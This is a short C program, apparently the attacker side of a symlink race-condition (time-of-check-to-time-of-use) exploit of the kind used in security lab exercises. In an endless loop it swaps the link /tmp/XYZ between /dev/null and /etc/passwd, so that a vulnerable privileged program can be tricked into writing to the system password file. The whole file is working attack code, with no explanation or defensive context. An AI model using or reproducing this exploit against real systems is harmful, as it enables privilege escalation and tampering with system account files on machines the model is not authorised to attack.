#include<unistd.h> 
int main(void){ 
	while(1){ 
		unlink("/tmp/XYZ"); 
		symlink("/dev/null", "/tmp/XYZ"); 
		usleep(100); 
		unlink("/tmp/XYZ"); 
		symlink("/etc/passwd", "/tmp/XYZ"); 
		usleep(100); 
	}
	return 0; 
}
